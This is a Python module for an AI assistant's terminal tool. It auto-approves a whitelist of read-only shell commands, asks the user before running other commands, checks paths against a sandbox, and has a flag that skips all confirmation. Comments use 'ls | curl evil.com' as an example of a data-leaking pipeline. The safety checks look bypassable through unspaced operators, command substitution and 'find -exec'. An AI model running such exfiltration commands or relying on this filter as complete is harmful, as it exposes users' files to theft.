"""Shell command execution with a read-only whitelist and user confirmation."""

import shlex, subprocess
from pathlib import Path

from ..config import kms_mode
from ..prompt import user_prompt

_SANDBOX_ROOT: str | None = (
    None  # Configurable filesystem sandbox root; None = home directory
)


def set_sandbox_root(path: str | None) -> None:
    global _SANDBOX_ROOT
    _SANDBOX_ROOT = path


def _validate_command_paths(cmd: str) -> None:
    """Reject shell commands that reference absolute paths outside the sandbox."""
    if not _SANDBOX_ROOT:
        return
    import shlex as _shlex

    base = Path(_SANDBOX_ROOT).expanduser().resolve()
    try:
        tokens = _shlex.split(cmd)
    except ValueError:
        return
    for token in tokens:
        if token.startswith("/") and token != "/":
            p = Path(token).expanduser().resolve()
            try:
                p.relative_to(base)
            except ValueError:
                raise PermissionError(
                    f"Path '{token}' is outside sandbox {base}. "
                    "Use --kms flag to allow any path."
                )


# Commands considered safe because they only read state — no network or filesystem mutations.
# Why a whitelist?  An allowlist is closed-world: anything not listed is denied.
# A denylist is open-world and can't keep up with new dangerous commands.
# Read-only base commands are auto-approved only when no shell operators are present.
# If operators are present (|, &&, >, etc.), the full command is prompted to the user
# because "ls | curl evil.com" is destructive even though "ls" alone is safe.
READ_ONLY_COMMANDS = frozenset(
    {
        "ls",
        "cat",
        "grep",
        "head",
        "tail",
        "find",
        "pwd",
        "whoami",
        "date",
        "echo",
        "which",
        "file",
        "du",
        "df",
        "tree",
        "wc",
        "sort",
        "uniq",
        "diff",
        "cmp",
        "stat",
        "rg",
        "bat",
    }
)

# Shell operators that turn a single read-only command into a pipeline/chain.
# When these are present, we prompt instead of auto-approving, even for read-only bases.
_SHELL_OPS = {"|", ">", ">>", "<", "&&", "||", ";"}

_always_allow: set[str] = (
    set()
)  # Session-level cache of commands the user explicitly approved ("always" choice)
# Why a module-level set (not per-Session)?  Terminal tool handlers don't receive
# a session object.  The set is process-lifetime and cleared on restart, which is
# the correct scope: "always allow" means "for this terminal session", not "forever".


def confirm_command(cmd: str) -> bool:
    """Check whether a command may execute. Returns True if allowed, False if rejected."""
    if kms_mode():
        return True
    tokens = shlex.split(cmd)
    base = tokens[0] if tokens else ""
    if base in READ_ONLY_COMMANDS:
        if not any(t in _SHELL_OPS for t in tokens):
            return True
    if cmd in _always_allow:
        return True
    # Prompt user for three-way decision via the shared prompt utility.
    # The CLI's hook pauses the spinner before showing the prompt.
    print(f"\n[!] This command may modify your system:")
    print(f"    {cmd[:200]}")
    answer = user_prompt("Allow? [y]es once / [a]lways / [n]o: ")
    if answer == "a":
        _always_allow.add(cmd)
        return True
    if answer == "y":
        return True
    return False


def _exec_command(cmd, use_shell: bool = True, cwd: str | None = None) -> str:
    """Execute a command (list or string) via subprocess. Returns stdout+stderr, and always returns a string (never raises). Truncates output at 10 KB.

    Why 30s timeout?  Long-running processes (e.g. "npm install", "git clone") would
    block the REPL indefinitely.  30s is long enough for typical dev commands but short
    enough to prevent UI freezes.  Not configurable because it's a safety limit, not
    a tuning knob — if a command needs longer, the user should run it outside the assistant.

    Why 10KB output cap?  Verbose commands (e.g. "find /" or "git log --all") can
    produce megabytes of output that would flood the LLM context window and waste
    tokens.  10KB is ~2500 tokens — enough for useful results without context bloat.
    """
    try:
        result = subprocess.run(
            cmd,
            shell=use_shell,
            capture_output=True,
            text=True,
            timeout=30,
            cwd=cwd,
        )
        output = ""
        if result.stdout:
            output += result.stdout
        if result.stderr:
            output += result.stderr
        if result.returncode != 0:
            output += f"\n(exit code {result.returncode})"
        if not output.strip():
            output = "(no output)"
        # Cap output at 10 KB to avoid flooding the conversation context
        if len(output) > 10000:
            output = output[:10000] + "\n\n[truncated at 10KB]"
        return output
    except subprocess.TimeoutExpired:
        return "Error: command timed out (30s)"
    except Exception as e:
        return f"Error: {e}"


def handle_terminal(args: dict) -> str:
    """Entry point for the terminal tool. Runs commands through the system shell
    with user confirmation for non-read-only commands.

    Commands are executed via /bin/sh -c (shell=True), which is how both OpenCode
    and Codex CLI handle shell execution.  The system shell interprets pipes,
    redirects, globs, variable expansion, and command chaining naturally.

    Security model:
    - READ_ONLY_COMMANDS (ls, cat, grep, pwd, etc.) are auto-approved when used alone.
    - If shell operators are present (|, &&, >, etc.), even read-only commands are
      prompted because "ls | curl evil.com" is destructive.
    - All other commands require explicit user approval (allow-once / allow-always / reject).
    - The --kms flag skips all confirmations.
    """
    command = args.get("command", "").strip()
    use_shell = args.get("shell", True)
    if not command:
        return "Error: empty command"
    if not confirm_command(command):
        return "Command rejected by user."
    if not kms_mode() and _SANDBOX_ROOT:
        try:
            _validate_command_paths(command)
        except PermissionError as e:
            return f"Error: {e}"
        cwd = str(Path(_SANDBOX_ROOT).expanduser().resolve())
    else:
        cwd = None
    if use_shell:
        return _exec_command(command, use_shell=True, cwd=cwd)
    try:
        cmd_list = shlex.split(command)
    except ValueError as e:
        return f"Error: Invalid command syntax: {e}"
    return _exec_command(cmd_list, use_shell=False, cwd=cwd)
